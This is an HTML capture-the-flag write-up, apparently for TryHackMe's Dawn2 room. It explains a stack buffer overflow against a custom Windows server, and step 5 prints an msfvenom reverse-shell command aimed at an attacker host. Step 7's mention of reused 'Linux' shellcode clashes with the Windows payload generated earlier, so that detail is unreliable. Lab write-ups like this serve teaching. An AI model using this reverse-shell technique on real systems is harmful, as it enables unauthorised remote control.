@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dawn2: a classic stack buffer overflow, twice</title>
+  <meta name="description" content="A full stack-based buffer overflow walkthrough against two custom Windows servers: fuzzing for the crash, finding the exact offset, confirming badchar-free space, locating a jmp esp, and weaponizing it with msfvenom shellcode, twice over for user and root.">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
+  <h1>Dawn2: a classic stack buffer overflow, twice</h1>
+  <p class="dek">A custom Windows server, leaked straight off its own web page, turns out to be vulnerable to a textbook stack-based buffer overflow. The target runs two separate instances of it, one for a user shell, a second running as root for the rest.</p>
+
+  <div class="meta-row">
+    <span class="pill">Room: Dawn2</span>
+    <span class="pill">Category: Binary Exploitation</span>
+    <span class="pill">Tools: Immunity Debugger, mona, msfvenom, nmap</span>
+  </div>
+
+  <div class="brief">
+    <p><strong>The setup:</strong> a web server hosting a download link to its own companion binary, plus two custom TCP services running on unusual ports. The job: reverse-engineer a crash into a working exploit, twice, once for a foothold and once for root.</p>
+  </div>
+
+  <section>
+    <h2 class="section-title">Background, In Plain Terms</h2>
+    <div class="skills">
+      <div class="skill">
+        <div class="skill-title">Stack buffer overflow</div>
+        <p>Sending more data into a fixed-size buffer than it can hold overwrites adjacent memory, including the saved return address (EIP) that controls where execution jumps next. Controlling that overwrite means controlling where the program goes next.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">jmp esp</div>
+        <p>Shellcode gets placed on the stack, and ESP points at the stack. Redirecting EIP to any instruction that reads "jump to ESP" lands execution directly on the injected shellcode, without needing to guess its exact memory address.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Part One: User Shell</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Find the target binary and confirm the crash</div>
+          <p>The web server's default page links directly to a zip containing the custom server binary and a README warning that the service "may crash after several requests," a strong hint before any fuzzing even starts. Confirming the file type:</p>
+          <pre><code>file dawn.exe
+dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
+          <p>With the binary loaded in Immunity Debugger on a Windows VM, sending 500 bytes of <code>A</code> followed by a null byte (per the README's own instructions) overwrites EIP with <code>41414141</code>, confirming the crash is controllable.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A target that hands you its own binary, and even a note about how it fails, is doing half the reconnaissance for you. Reading the README literally (send a null byte to terminate the message) turned out to be load-bearing for triggering the crash at all.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Find the exact offset</div>
+          <p>A unique, non-repeating 500-byte pattern (generated with <code>msf-pattern_create</code>) replaces the plain A's. Whatever four bytes land in EIP at crash time pinpoint the exact offset into the buffer:</p>
+          <pre><code>msf-pattern_offset -q &lt;4-bytes-from-EIP&gt;
+[*] Exact match at offset 272</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A repeating pattern like all-A's can't tell you where in the buffer the crash happened, every chunk looks the same. A non-repeating pattern makes every 4-byte window unique, so whatever ends up in EIP maps back to one exact position.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Confirm control and check for space</div>
+          <p>Sending the offset in A's, four B's, then a null byte confirms EIP lands exactly on <code>42424242</code>. Following that with 400 C's (the rough size budget for a reverse-shell payload) confirms there's room in the buffer for real shellcode without corrupting anything:</p>
+          <pre><code>payload = A*offset + B*4 + C*400 + nullbyte</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Controlling EIP is necessary but not sufficient, the payload also has to fit. Confirming space for it before writing real shellcode avoids discovering a buffer-size problem after everything else is already working.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Rule out bad characters</div>
+          <p>Certain byte values (null bytes, line feeds, carriage returns) get mangled by string-handling code before they ever reach the buffer intact. Sending every possible byte value from <code>\x01</code> to <code>\xff</code> and comparing what Immunity Debugger shows in memory against what was actually sent identifies which, if any, get corrupted in transit.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Shellcode generated without knowing the bad-character list can silently break the moment it includes one of them. Testing the full byte range up front means the final payload can be generated with exactly the right exclusion list from the start.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">Find a jump point and weaponize it</div>
+          <p>Mona's built-in search finds a usable <code>jmp esp</code> instruction with no protections enabled:</p>
+          <pre><code>!mona jmp -r esp</code></pre>
+          <p>With the offset, a working jump address, and a confirmed bad-character list, <code>msfvenom</code> generates working shellcode matched to the target's architecture and OS:</p>
+          <pre><code>msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=&lt;attacker-ip&gt; LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode</code></pre>
+          <p>The final payload (offset padding, jump address, a NOP sled, the shellcode, then a null terminator) sent against the real target lands a reverse shell.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Every earlier step exists to answer one question this payload depends on: exactly how many bytes, which address to jump to, and which bytes to avoid. Skipping any of them turns this into blind guessing instead of a reliable exploit.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Part Two: Root, via a Second Instance</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Find the second server, running as root</div>
+          <p>A second binary, the same custom server software but a different build, sits on the target and listens on a different port entirely, this one running with root privileges.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Gaining a foothold is rarely the end of enumeration, it's a reason to look harder. The same vulnerable software class, redeployed with higher privileges, is exactly the kind of thing a first shell makes visible that external scanning wouldn't.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Repeat the process against the new target</div>
+          <p>Same methodology, different numbers. The crash is confirmed the same way, and this time the offset comes out much shorter:</p>
+          <pre><code>msf-pattern_offset -q &lt;4-bytes-from-EIP&gt;
+[*] Exact match at offset 13</code></pre>
+          <p>The bad-character test comes back clean against the same exclusion list as before, and a fresh <code>!mona jmp -r esp</code> search finds a valid jump address for this binary's own memory layout. The existing Linux reverse-shell shellcode, already generated for the target's architecture, gets reused directly.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The same software, even a different build, tends to fail the same way. Running through the identical methodology (not guessing the new offset, not skipping the bad-char check) is what makes this repeatable rather than lucky, and it confirms the two binaries really are built from the same vulnerable code path with different buffer sizes.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Full Attack Chain</h2>
+    <pre><code>Web server: companion binary leaked via a download link
+  &rarr; File type confirmed: 32-bit Windows PE
+       &rarr; Crash confirmed: 500 A's overwrite EIP
+            &rarr; Unique pattern: exact offset found
+                 &rarr; Space confirmed: room for a real payload
+                      &rarr; Bad chars ruled out
+                           &rarr; jmp esp found via mona
+                                &rarr; msfvenom shellcode: reverse shell as a normal user
+
+Second server instance found, running as root
+  &rarr; Same methodology repeated: new offset, same bad chars, new jmp esp
+       &rarr; Shellcode reused: reverse shell as root</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Takeaways</h2>
+    <div class="skills">
+      <div class="skill">
+        <div class="skill-title">A crash is not an exploit until every variable is pinned down</div>
+        <p>Offset, bad characters, and a reliable jump address all have to be correct simultaneously. Skipping the bad-character check is the most common way a theoretically correct exploit fails in practice.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">The same vulnerable code, redeployed, is still vulnerable</div>
+        <p>Finding one instance of a flawed custom service is a strong reason to look for others. A second copy running with higher privileges turned a user shell into root using the identical technique.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer>tryhackme.com &middot; solved via classic stack-based buffer overflow exploitation</footer>
+
+</div>
+</body>
+</html>
